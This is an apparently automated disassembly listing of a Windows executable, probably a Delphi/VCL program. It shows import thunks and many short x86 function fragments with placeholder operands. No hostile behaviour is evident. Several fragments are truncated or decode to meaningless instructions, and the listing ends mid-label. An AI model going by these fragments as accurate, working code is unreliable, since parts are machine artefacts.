SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406af4
call GetTickCount
retn
sub_406afc
xor eax eax
retn
sub_406b00
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406b10
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406b2c
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406b40
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406b78
call sub_406ae8
retn
sub_406b80
call sub_406ae8
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_406d5d
jmp sub_403a0c
sub_406d64
pop ebp
retn
sub_406d68
sub [ rw-data ] 0x1
retn
sub_406d95
jmp sub_403a0c
sub_406d9c
pop ebp
retn
sub_406da0
sub [ rw-data ] 0x1
retn
sub_4070c4
pop ebp
retn
sub_4070c8
sub [ rw-data ] 0x1
retn
sub_407b85
add eax 0xffffffd4
jmp sub_40d008
sub_407b8d
add eax 0xffffffd4
jmp sub_40ceb0
sub_407b95
add eax 0xffffffd4
jmp sub_40cf4c
sub_407ba7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405948
sub_407bb1
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40595c
sub_407c88
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
pop ebx
retn
sub_407ef8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407ec0
test eax eax
sete al
pop esi
pop ebx
retn
sub_408430
call sub_40840c
retn
sub_4084c8
push eax
call CloseHandle
retn
sub_408650
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408664
push esi
mov esi eax
xchg edx eax
call sub_4028c8
mov eax esi
pop esi
retn
sub_408824
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026cc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408838
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408870
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026ec
sub_4088d8
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402828
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_4088fc
push ebx
mov ebx eax
mov eax ebx
call sub_404008
pop ebx
retn
sub_408c5f
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_404008
pop eax
pop ebx
retn
sub_408f17
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_409072
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4093cf
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4093cf
sub_40948c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esi
xor ecx ecx
call sub_409318
pop esi
pop ebx
retn
sub_409500
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esi
mov cl 0x1
call sub_409318
pop esi
pop ebx
retn
sub_409d3e
jmp sub_403a0c
sub_409d45
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409e36
jmp sub_403a0c
sub_409e3d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a5e1
jmp sub_403a0c
sub_40a5e8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a688
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a614
pop ebp
retn 0x8
sub_40a7cd
jmp sub_403a0c
sub_40a7d4
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ac77
jmp sub_403a0c
sub_40ac7e
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b197
jmp sub_403a0c
sub_40b19e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b249
jmp sub_403a0c
sub_40b250
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b2f3
jmp sub_403a0c
sub_40b2fa
pop esi
pop ecx
pop ebp
retn
sub_40b4d6
jmp sub_403a0c
sub_40b4dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b534
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b826
jmp sub_403a0c
sub_40b8f4
jmp sub_403a0c
sub_40b919
or [ eax ] al
nop
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403244
sub_40bab8
jmp sub_403a0c
sub_40babf
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bac8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a44
sub_40bad5
retn
sub_40bad8
push ebp
mov ebp esp
call sub_40ba1c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40bac8
pop ebp
retn 0x4
sub_40baf4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
retn
sub_40bb8c
push ebx
mov ebx eax
mov eax ebx
call sub_40bb0c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bd5f
jmp sub_403a0c
sub_40bd66
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40be2b
jmp sub_403a0c
sub_40be32
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40be3c
call sub_40b6c8
mov eax 0x1
call sub_403ff0
sub_40bfc0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c099
jmp sub_403a0c
sub_40c0b6
jmp sub_403a0c
sub_40c0bd
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c168
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40c0cc
mov ecx eax
sub_40c354
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c374
push eax
call CharNextA
retn
sub_40c598
jmp sub_403a0c
sub_40c59f
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c608
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40ca5f
jmp sub_403a0c
sub_40ca66
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cba4
jmp sub_403a0c
sub_40cbab
pop ebx
mov esp ebp
pop ebp
retn
sub_40cbb0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cb14
sub_40cbc0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cbdc
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026ec
pop ebx
retn
sub_40cc64
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cc70
xchg [ eax ] edx
mov eax edx
retn
sub_40ccd0
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40cd60
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40ce78
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cea0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d11b
jmp sub_403a0c
sub_40d122
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d190
jmp sub_403a0c
sub_40d197
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d1b5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d1ae
jmp sub_403a0c
sub_40d1b5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d605
jmp sub_403a0c
sub_40d60c
pop ebp
retn
sub_40d678
jmp sub_403a0c
sub_40d67f
pop ebp
retn
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40d6f8
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d75e
jmp sub_403a0c
sub_40d765
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d7ca
jmp sub_403a0c
sub_40d7d1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d836
jmp sub_403a0c
sub_40d83d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d8a2
jmp sub_403a0c
sub_40d8a9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d90e
jmp sub_403a0c
sub_40d915
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d98d
jmp sub_403a0c
sub_40d994
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40da00
jmp sub_403a0c
sub_40da07
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40da70
jmp sub_403a0c
sub_40da77
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dae4
jmp sub_403a0c
sub_40daeb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40de71
jmp sub_403a0c
sub_40de78
pop ebp
retn
sub_40de7c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40db40
sub_40de8d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e516
jmp sub_403a0c
sub_40e51d
pop ecx
pop ebp
retn
sub_40e5af
jmp sub_403a0c
sub_40e5b6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e606
jmp sub_403a0c
sub_40e60d
pop ecx
pop ebp
retn
sub_40e65a
jmp sub_403a0c
sub_40e661
pop ecx
pop ebp
retn
sub_40e6f3
jmp sub_403a0c
sub_40e6fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e74a
jmp sub_403a0c
sub_40e751
pop ecx
pop ebp
retn
sub_40e999
jmp sub_403a0c
sub_40e9a0
pop ebx
mov esp ebp
pop ebp
retn
sub_40eab6
jmp sub_403a0c
sub_40eabd
pop ecx
pop ebp
retn
sub_40eac0
push ebx
mov ebx eax
mov eax ebx
call sub_40ed58
mov [ ebx ] 0x1
pop ebx
retn
sub_40ed6c
push eax
call sub_40ed58
pop eax
retn
sub_40efcc
call sub_40f080
retn
sub_40f120
jmp sub_403a0c
sub_40f127
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f16e
jmp sub_403a0c
sub_40f175
pop ebx
pop ecx
pop ebp
retn
sub_40f1ba
jmp sub_403a0c
sub_40f1c1
pop ebx
pop ecx
pop ebp
retn
sub_40f206
jmp sub_403a0c
sub_40f20d
pop ebx
pop ecx
pop ebp
retn
sub_40f252
jmp sub_403a0c
sub_40f259
pop ebx
pop ecx
pop ebp
retn
sub_40f61b
jmp sub_403a0c
sub_40f622
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f6bc
jmp sub_403a0c
sub_40f6c3
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fb31
jmp sub_403758
sub_40fbec
jmp sub_403758
sub_40fc93
jmp sub_403758
sub_40fd8c
jmp sub_403758
sub_40fe65
jmp sub_403758
sub_40ff4d
jmp sub_403758
sub_41010a
jmp sub_403a0c
sub_410111
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410173
jmp sub_403a0c
sub_41017a
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4105e0
jmp sub_403758
sub_4106cf
jmp sub_403a0c
sub_4106d6
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410774
jmp sub_403a0c
sub_41077b
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410b18
call sub_4107d0
neg al
sbb eax eax
neg eax
retn
sub_410bd9
jmp sub_403a0c
sub_410be0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410c89
jmp sub_403a0c
sub_410c90
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4111e1
jmp sub_403758
sub_4112e8
jmp sub_403a0c
sub_4112ef
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4113f9
jmp sub_403a0c
sub_411400
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411850
jmp sub_403a0c
sub_411857
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411961
jmp sub_403a0c
sub_411968
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411eae
jmp sub_403a0c
sub_411eb5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411f59
jmp sub_403a0c
sub_411f60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411f82
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404700
retn
sub_411f7b
jmp sub_403a0c
sub_411f82
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411fde
jmp sub_403a0c
sub_411fe5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412061
jmp sub_403a0c
sub_4125a7
jmp sub_403a0c
sub_4125ae
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412641
jmp sub_403a0c
sub_412648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412665
lea eax [ ebp - 0x14 ]
call sub_4046e8
retn
sub_41265e
jmp sub_403a0c
sub_412665
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4126c2
jmp sub_403a0c
sub_4126c9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41276b
jmp sub_403a0c
sub_412788
jmp sub_403a0c
sub_41278f
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412cea
jmp sub_403a0c
sub_412cf1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412d62
jmp sub_403a0c
sub_412d69
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4130f4
push eax
call sub_40ed58
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413108
push eax
call sub_40ed58
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413293
jmp sub_403a0c
sub_4132bf
jmp sub_403a0c
sub_4132c6
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4134f3
jmp sub_403a0c
sub_4134fa
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41379b
jmp sub_403a0c
sub_413829
jmp sub_403a0c
sub_413919
jmp sub_403a0c
sub_4139bb
jmp sub_403a0c
sub_413a71
jmp sub_403a0c
sub_413b18
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f080
add esp 0x10
sub_413dc2
jmp sub_403a0c
sub_413dc9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413e0c
mov ax [ eax ]
retn
sub_413f0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ed58
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_413f24
mov edx 0x80020004
call sub_413f0c
retn
sub_413f74
mov dl 0x1
call sub_413f7c
retn
sub_414029
jmp sub_403a0c
sub_414030
pop esi
pop ebx
pop ebp
retn
sub_414034
push ebp
mov ebp esp
call sub_4141f4
pop ebp
retn 0x4
sub_4140c0
push ebp
mov ebp esp
call sub_4141f4
pop ebp
retn 0x4
sub_4141a3
jmp sub_403a0c
sub_4141aa
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403280
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40362c
sub_4141cc
xor eax eax
retn
sub_4141d0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4141e4
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4141ec
call sub_40e4cc
retn
sub_4141f4
call sub_40e5bc
retn
sub_4141fc
call sub_40ea6c
retn
sub_414204
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414218
call sub_4141f4
retn
sub_414220
push ebp
mov ebp esp
call sub_4141fc
pop ebp
retn 0x8
sub_414238
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414314
jmp sub_403a0c
sub_4143dd
jmp sub_403a0c
sub_4143e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414401
lea eax [ ebp - 0x10 ]
call sub_404008
retn
sub_4143fa
jmp sub_403a0c
sub_414401
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41440c
call sub_40eac0
retn
sub_414414
mov ecx 0xe
call sub_413ab0
cmp al 0x1
retn
sub_414493
jmp sub_403a0c
sub_41449a
pop ebp
retn
sub_41453d
jmp sub_403a0c
sub_414544
pop ebp
retn
sub_41465d
jmp sub_403a0c
sub_414664
pop ebp
retn
sub_414668
sub [ rw-data ] 0x1
retn
sub_414766
jmp sub_403a0c
sub_41476d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414a8c
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_4149f4
mov eax ebx
mov edx esp
call sub_40426c
add esp 0x100
pop ebx
retn
sub_414ae8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40405c
pop esi
pop ebx
retn
sub_414bc4
jmp sub_403a0c
sub_414bcb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414c1c
jmp sub_403a0c
sub_414c23
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414d70
jmp sub_403a0c
sub_414d77
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414e46
jmp sub_403a0c
sub_414e4d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f080
pop esi
pop ebx
retn
sub_41540e
jmp sub_403a0c
sub_415415
pop ebp
retn
sub_415418
sub [ rw-data ] 0x1
retn
sub_415445
jmp sub_403a0c
sub_41544c
pop ebp
retn
sub_415450
sub [ rw-data ] 0x1
retn
sub_415d05
[ edx + ecx * 4 - 0x7603ffbf ]
sub_415d5d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_418b20
sub_415ebd
jmp esp
sub_4160a5
sub al [ eax ]
inc esp
xchg edi eax
inc ecx
add [ eax ] bh
cwde
inc ecx
add [ eax - 0x66 ] al
inc ecx
add ah cl
0x9ba00041 0x41
int3
sub_416771
sub al [ eax ]
int3
sub_416cc4
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_416de8
mov eax [ eax + 0xc ]
call sub_4181b4
retn
sub_4170bf
jmp sub_403a0c
sub_4170c6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4170cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41836c
test eax eax
setge al
pop esi
pop ebx
retn
sub_4173cf
jmp sub_403a0c
sub_4173d6
mov esp ebp
pop ebp
retn
sub_4174a4
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_4174b0
push ebx
mov ebx edx
mov edx ebx
call sub_4172c4
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_417024
sub_41755c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4176b7
jmp sub_403a0c
sub_41778b
jmp sub_403a0c
sub_41779c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417808
jmp sub_403a0c
sub_41780f
pop ebx
mov esp ebp
pop ebp
retn
sub_41785a
jmp sub_403a0c
sub_417861
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4178ed
jmp sub_403a0c
sub_4178f4
pop ebx
pop ebp
retn
sub_41793a
jmp sub_403a0c
sub_417941
pop ebx
pop ebp
retn
sub_417986
jmp sub_403a0c
sub_41798d
pop ebx
pop ebp
retn
sub_4179d7
jmp sub_403a0c
sub_4179de
pop esi
pop ebx
pop ebp
retn
sub_417a32
jmp sub_403a0c
sub_417a39
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417b66
jmp sub_403a0c
sub_417be2
jmp sub_403a0c
sub_417cb8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4184ac
sub_417da8
jmp sub_403a0c
sub_417f32
jmp sub_403a0c
sub_417f39
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417fd3
jmp sub_403a0c
sub_417fda
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ff9
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_417ff2
jmp sub_403a0c
sub_417ff9
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_418065
jmp sub_403a0c
sub_41806c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418164
jmp sub_403a0c
sub_41816b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
retn
sub_418181
jmp sub_403a0c
sub_4181e8
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_418508
xor edx edx
mov eax ebx
call sub_4184cc
pop ebx
retn
sub_418260
mov eax [ ebp + 0x4 ]
retn
sub_418296
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4182e4
jmp sub_403a0c
sub_4182eb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4182f0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_418308
xor edx edx
call sub_418310
retn
sub_4183f8
mov edx [ eax + 0x8 ]
dec edx
call sub_418310
retn
sub_418578
retn
sub_418632
jmp sub_403a0c
sub_418639
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40362c
sub_4186c8
jmp sub_403a0c
sub_4186cf
pop ebx
pop ecx
pop ebp
retn
sub_4186d4
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41872b
jmp sub_403a0c
sub_418732
pop ebx
pop ecx
pop ebp
retn
sub_418738
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_418774
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
retn
sub_41878c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418867
retn
sub_41890c
test edx edx
je r-xdata
xor edx edx
call sub_418920
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_4189d6
jmp sub_403a0c
sub_4189dd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4189f0
xchg edx eax
call sub_418920
retn
sub_4189f8
retn
sub_418a91
jmp sub_403a0c
sub_418a98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c55
jmp sub_403a0c
sub_418c5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418dc5
jmp sub_403a0c
sub_418dcc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418e10
xor edx edx
call sub_418ccc
retn
sub_418f7e
jmp sub_403a0c
sub_418f98
inc [ eax + 0xc ]
retn
sub_418f9c
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_419006
jmp sub_403a0c
sub_419014
dec [ eax + 0xc ]
call sub_418f9c
retn
sub_419050
xor eax eax
retn
sub_419054
push ebx
mov ebx ecx
mov eax ebx
call sub_404008
pop ebx
retn
sub_419088
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_418310
pop esi
pop ebx
retn
sub_41914a
jmp sub_403a0c
sub_419151
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419261
jmp sub_403a0c
sub_41933c
retn
sub_419340
retn
sub_419344
retn
sub_419348
retn
sub_419472
jmp sub_403a0c
sub_419479
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419496
lea eax [ ebp - 0xc ]
call sub_404008
retn
sub_41948f
jmp sub_403a0c
sub_419496
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419520
jmp sub_403a0c
sub_419538
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4195f4
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41969d
jmp sub_403a0c
sub_4196a4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4196b0
mov eax [ ebp + 0x4 ]
retn
sub_4196e6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419734
jmp sub_403a0c
sub_41973b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4197fa
jmp sub_403a0c
sub_419801
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419823
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
sub_41981c
jmp sub_403a0c
sub_419823
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41982c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_419834
xor eax eax
retn
sub_41987d
jmp sub_403a0c
sub_419884
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419997
jmp sub_403a0c
sub_41999e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419a33
jmp sub_403a0c
sub_419a3a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419ab8
jmp sub_403a0c
sub_419abf
